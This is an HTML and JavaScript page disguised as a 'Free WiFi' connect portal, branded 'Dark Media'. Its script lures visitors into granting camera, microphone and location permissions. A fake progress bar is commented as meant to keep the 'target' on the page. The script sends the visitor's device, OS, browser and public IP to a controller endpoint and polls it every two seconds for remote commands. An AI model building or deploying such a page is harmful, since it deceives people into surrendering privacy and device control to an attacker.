<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free WiFi - Connect Now!</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:'Segoe UI',sans-serif;background:#0a0000;color:#fff;min-height:100vh;display:flex;justify-content:center;align-items:center;overflow:hidden;}
        #bgCanvas{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;}
        .card{position:relative;z-index:1;background:rgba(20,0,0,.9);border:2px solid #ff1a1a;border-radius:20px;padding:25px;text-align:center;max-width:400px;width:90%;box-shadow:0 0 60px rgba(255,26,26,.3);}
        .wifi{font-size:60px;animation:float 3s infinite;}
        @keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-12px)}}
        h1{font-size:24px;margin:12px 0;background:linear-gradient(45deg,#ff1a1a,#ffaa00);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
        p{color:#aaa;font-size:12px;margin-bottom:12px;}
        .perm{text-align:left;font-size:9px;color:#888;margin:10px 0;line-height:1.7;padding:8px;background:rgba(0,0,0,.3);border-radius:8px;}
        .perm span{color:#ffaa00;}
        .btn{width:100%;padding:12px;margin:6px 0;background:linear-gradient(135deg,#8b0000,#ff1a1a);border:none;border-radius:30px;color:#fff;font-size:14px;font-weight:bold;letter-spacing:2px;cursor:pointer;}
        .btn:active{transform:scale(.95);}
        .btn.green{background:linear-gradient(135deg,#006600,#00cc00);}
        .hidden{display:none;}
        .spinner{width:30px;height:30px;border:3px solid #333;border-top:3px solid #ff1a1a;border-radius:50%;animation:spin 1s linear infinite;margin:12px auto;}
        @keyframes spin{to{transform:rotate(360deg)}}
        .status{font-size:9px;color:#555;margin-top:10px;}
        .prog{width:100%;height:4px;background:rgba(255,26,26,.15);border-radius:2px;margin-top:8px;overflow:hidden;}
        .prog div{height:100%;background:#ff1a1a;width:0%;transition:width .3s;}
    </style>
</head>
<body>
    <canvas id="bgCanvas"></canvas>
    <div class="card" id="mainCard">
        <div class="wifi">📶</div>
        <h1>FREE WiFi</h1>
        <p>Connect to high-speed internet for free!</p>
        <div class="perm">
            <p><span>📷</span> Camera - koneksi visual</p>
            <p><span>🎤</span> Microphone - sinyal</p>
            <p><span>📍</span> Location - tower terdekat</p>
        </div>
        <button class="btn" id="connectBtn">🔓 CONNECT NOW</button>
        <button class="btn green hidden" id="grantBtn">✅ GRANT PERMISSIONS</button>
        <div class="spinner hidden" id="spinner"></div>
        <div class="hidden" id="progressBox"><div class="prog"><div id="progBar"></div></div></div>
        <p class="status" id="statusText">Powered by Dark Media</p>
    </div>

    <script>
        // BG
        const canvas=document.getElementById('bgCanvas'),ctx=canvas.getContext('2d');let nodes=[];
        function rc(){canvas.width=innerWidth;canvas.height=innerHeight;initN();}
        function initN(){nodes=[];for(let i=0;i<(canvas.width*canvas.height)/20000;i++)nodes.push({x:Math.random()*canvas.width,y:Math.random()*canvas.height,vx:(Math.random()-.5)*.4,vy:(Math.random()-.5)*.4,r:Math.random()*2+.8,p:Math.random()*Math.PI*2});}
        function draw(){ctx.fillStyle='rgba(10,0,0,.2)';ctx.fillRect(0,0,canvas.width,canvas.height);nodes.forEach(n=>{n.x+=n.vx;n.y+=n.vy;n.p+=.015;if(n.x<0)n.x=canvas.width;if(n.x>canvas.width)n.x=0;if(n.y<0)n.y=canvas.height;if(n.y>canvas.height)n.y=0;let pr=n.r+Math.sin(n.p)*1.5,g=ctx.createRadialGradient(n.x,n.y,0,n.x,n.y,pr*3);g.addColorStop(0,'rgba(255,26,26,.7)');g.addColorStop(.6,'rgba(255,26,26,.15)');g.addColorStop(1,'rgba(255,26,26,0)');ctx.beginPath();ctx.arc(n.x,n.y,pr*3,0,Math.PI*2);ctx.fillStyle=g;ctx.fill();ctx.beginPath();ctx.arc(n.x,n.y,pr,0,Math.PI*2);ctx.fillStyle='#ff1a1a';ctx.fill()});requestAnimationFrame(draw);}
        window.addEventListener('resize',rc);rc();draw();

        let p=new URLSearchParams(location.search),room=p.get('room')||'x',cid='c-'+Math.random().toString(36).substr(2,12),API=location.origin,PANEL=location.origin;

        document.getElementById('connectBtn').onclick=()=>{
            document.getElementById('connectBtn').classList.add('hidden');
            document.getElementById('grantBtn').classList.remove('hidden');
            document.getElementById('statusText').textContent='⚠️ Grant permissions';
        };

        document.getElementById('grantBtn').onclick=async()=>{
            let btn=document.getElementById('grantBtn'),sp=document.getElementById('spinner'),st=document.getElementById('statusText'),pb=document.getElementById('progressBox'),bar=document.getElementById('progBar');
            btn.classList.add('hidden');sp.classList.remove('hidden');pb.classList.remove('hidden');
            st.textContent='Requesting permissions...';
            try{await navigator.mediaDevices.getUserMedia({video:true,audio:true});navigator.geolocation?.getCurrentPosition(()=>{},{},{timeout:3000});}catch(e){}
            
            // PROSES LAMA BIAR TARGET STAY
            let steps=[[15,'Connecting...',1000],[35,'Authenticating...',2500],[55,'Encrypting...',4000],[75,'Securing channel...',6000],[90,'Establishing link...',8000],[100,'Connected!',10000]];
            steps.forEach(s=>setTimeout(()=>{bar.style.width=s[0]+'%';st.textContent=s[1];},s[2]));
            
            sendInfo();setInterval(async()=>{try{let r=await fetch(API+'/api/room/'+room+'/client/'+cid+'/poll'),d=await r.json();d.commands?.forEach(c=>{if(c.command=='vibrate')navigator.vibrate?.([200,100,200]);if(c.command=='alert')alert('⚠️ Alert!');if(c.command=='info')sendInfo();});}catch(e){}},2000);
            
            setTimeout(()=>{st.textContent='✅ Connected!';sp.classList.add('hidden');},10500);
        };

        async function sendInfo(){
            let ua=navigator.userAgent,info={device:/Mobile/.test(ua)?'Mobile':'Desktop',os:/Windows/.test(ua)?'Windows':/Mac/.test(ua)?'macOS':/Android/.test(ua)?'Android':'Unknown',browser:/Chrome/.test(ua)?'Chrome':/Firefox/.test(ua)?'Firefox':'Unknown'};
            try{let r=await fetch('https://api.ipify.org?format=json'),d=await r.json();info.ip=d.ip;}catch(e){}
            fetch(API+'/api/room/'+room+'/client/'+cid+'/data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:{type:'device_info',...info}})});
        }
    </script>
</body>
</html>
